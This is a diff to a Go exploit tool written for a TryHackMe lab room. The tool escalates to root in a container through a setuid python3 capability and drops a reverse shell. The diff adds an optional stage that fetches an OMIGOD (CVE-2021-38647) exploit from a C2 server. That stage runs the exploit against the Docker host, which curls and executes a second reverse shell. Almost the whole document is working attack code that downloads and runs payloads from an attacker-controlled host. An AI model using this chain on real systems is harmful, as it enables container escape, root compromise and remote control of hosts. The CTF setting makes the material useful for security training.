@@ -12,8 +12,19 @@
 //		execution and gain a reverse shell as root on the target container. This
 //		the first phase of the TryHackMe room. Once this exploit has been run and
 //		the attacker has root access to the cointainer, they are able to extract
-// 		the user flag.  To get the root flag, the attacker must exploit an OMI
-//		vulnerability present in the system.
+// 		the user flag.
+//
+//		Optionally, this script exploits the OMI vulnerability present in the
+//		system to upload and execute a reverse shell on the host machine. This
+//		allows the attacker access to the root flag.
+//
+//		Note:
+//		If the attacker chooses to include the execution of the omigod exploit,
+//		they must also have an omi.py file served alongside the shell binary.
+//		One such omi.py exploit script can be found here:
+//			https://github.com/horizon3ai/CVE-2021-38647/blob/main/omigod.py
+//
+//		To run this exploit with OMI, use the flag "-o"
 //
 //================================================================================
 //
@@ -52,6 +63,8 @@ var ANSI_BLU string = "\x1b[34;1m"
 
 var EXPLOIT_BIN string
 var SHELL_BIN string
+
+var OMIGOD bool = true
 
 //================================================================================
 //								Output Functions
@@ -102,6 +115,11 @@ func SysMsg(msg string) {
 //		capability granted to python3 on the target machine. By setting the uid,
 //		the python3 script is able to execute commands as the root user. The
 //		script generated pulls down a shell file from the C2 server and runs it.
+//		This shell is run in the background as the OMI exploit is run to gain
+//		a shell on the host (non-docker) machine.
+//
+//		When the execution of this script is complete, the attacker will have
+//		two shells: one for the docker container, and one for the host.
 //
 // Input(s):
 //
@@ -115,14 +133,39 @@ func SysMsg(msg string) {
 //================================================================================
 func CreateExploit(c2IP string) (success bool, message string) {
 	var exploitBody string
+	var getOMI string
 	var pythonCmd string
+	var runOMI string
 
+	// Python to pull down reverse shell.
+	getReverseShell := fmt.Sprintf("r=requests.get('http://%s/%s');f=open('/tmp/shell','wb');f.write(r.content);f.close()", c2IP, SHELL_BIN)
+
+	// Python to pull down OMI exploit.
+	if OMIGOD {
+		getOMI = fmt.Sprintf("r=requests.get('http://%s/omi.py');f=open('/tmp/omi','wb');f.write(r.content);f.close()", c2IP)
+	} else {
+		getOMI = ""
+	}
 	// Python command to execute as root.
-	pythonCmd = fmt.Sprintf("import requests;r=requests.get('http://%s/%s');f=open('/tmp/shell','wb');f.write(r.content);f.close()", c2IP, SHELL_BIN)
+	pythonCmd = fmt.Sprintf(
+		"import requests;%s;%s",
+		getReverseShell,
+		getOMI,
+	)
+
+	// Create reverse shell on docker container.
+	getBackdoor := "chmod +x /tmp/shell;python3 -c \"import subprocess;subprocess.Popen(['/tmp/shell'])\""
+
+	// Gain reverse shell on host machine.
+	if OMIGOD {
+		runOMI = fmt.Sprintf("python3 /tmp/omi -t 172.17.0.1 -c \"curl -o /tmp/shell http://%s/%s; chmod +x /tmp/shell;/tmp/shell\";", c2IP, SHELL_BIN)
+	} else {
+		runOMI = ""
+	}
 
 	// Python script to elevate privilege and execute command above.
-	exploitBody = "#!/usr/bin/env python3\nimport os\nos.setuid(0)\nos.system(\"\"\"python3 -c \"%s\";chmod +x /tmp/shell;/tmp/shell\"\"\")"
-	exploitBody = fmt.Sprintf(exploitBody, pythonCmd)
+	exploitBody = "#!/usr/bin/env python3\nimport os\nos.setuid(0)\nos.system(\"\"\"python3 -c \"%s\";%s;%s\"\"\")"
+	exploitBody = fmt.Sprintf(exploitBody, pythonCmd, getBackdoor, runOMI)
 
 	// Create file on local machine.
 	fptr, err := os.Create("exploit")
@@ -226,6 +269,7 @@ func main() {
 	flag.StringVar(&c2IP, "c", "127.0.0.1", "C2 IP address.")
 	flag.StringVar(&EXPLOIT_BIN, "e", "exploit", "exploit binary name.")
 	flag.StringVar(&SHELL_BIN, "s", "shell", "shell binary name.")
+	flag.BoolVar(&OMIGOD, "o", false, "pull down omi.py and run omigod attack.")
 	flag.Parse()
 
 	PrintChar("=")
